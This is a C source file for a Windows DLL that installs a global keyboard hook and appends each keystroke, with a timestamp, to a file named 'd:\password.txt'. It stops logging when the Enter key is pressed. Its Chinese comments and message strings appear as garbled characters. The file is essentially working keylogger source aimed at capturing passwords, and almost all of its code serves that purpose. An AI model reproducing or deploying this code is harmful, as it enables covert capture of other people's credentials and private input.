#define  _CRT_SECURE_NO_WARNINGS
#include "hook.h"
//���ֶԵ�ǰ�߳�ʵ����һ������
HINSTANCE HInstance = NULL;
#pragma data_seg("hook")
HHOOK currentHook = NULL;
#pragma data_seg()
DLL_EXPORT void initHook();
DLL_EXPORT LRESULT CALLBACK hookCallback(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
);
DLL_EXPORT void endHook();



BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		HInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	default:
		break;
	}
	return TRUE;
}
void outputTime() {
	FILE *file = NULL;
	file = fopen("d:\\password.txt", "a");
	
	time_t currentTime = NULL;
	currentTime = time(NULL);
	struct tm *tmTime;
	tmTime = localtime(&currentTime);

	char *format = "%Y-%m-%d %H:%M:%S";
	char strTime[30] = { 0 };

	strftime(strTime,30,format,tmTime);

	fprintf(file, "\n%s\n", strTime);
	fclose(file);
}
DLL_EXPORT void initHook() {
	currentHook = SetWindowsHookEx(WH_KEYBOARD,hookCallback,HInstance,0);
	if (currentHook == NULL)
	{
		MessageBoxA(0, "���̹��Ӱ�װʧ��", "��ʾ", 0);
	}
	else {
		MessageBoxA(0, "���̹��Ӱ�װ�ɹ�", "��ʾ", 0);
		outputTime();
		MSG msg;
		while (GetMessage(&msg, 0, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessageW(&msg);
		}
	}
	//�ڷ�MFC������,���ڲ����Զ�������Ϣ�ַ�,��Ҫ�Լ��ֶ��ַ�
}


LRESULT CALLBACK hookCallback(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	if (nCode < 0)
	{
		//���codeС��0���������CallNextHookEx������Ϣ�����������Ϣ��������CallNextHookEx�ķ���ֵ��  
		return CallNextHookEx(currentHook, nCode, wParam, lParam);
	}

	if (nCode == HC_ACTION && lParam > 0)
	{
		//code����HC_ACTION����ʾ��Ϣ�а���������Ϣ  
		//���ΪWM_KEYDOWN������ʾ������Ӧ���ı�  
		char szBuf[MAXBYTE] = { 0 };
		//�ú������Ը���lParam�еĲ�ͬλ��ȡ�����ΰ�������,��wParam������ͬ
		GetKeyNameTextA(lParam, szBuf, MAXBYTE);
		printf("%c,%d,%s\n",wParam,lParam,szBuf);
		FILE *file = NULL;
		file = fopen("d:\\password.txt","a");
		fprintf(file,"%c ",wParam);
		fclose(file);
		if (wParam == VK_RETURN)
		{
			endHook();
		}
	}

	return CallNextHookEx(currentHook,nCode,wParam,lParam);
}

DLL_EXPORT void endHook()
{
	UnhookWindowsHookEx(currentHook);
	MessageBoxA(0, "ж�سɹ�", "��ʾ", 0);
}
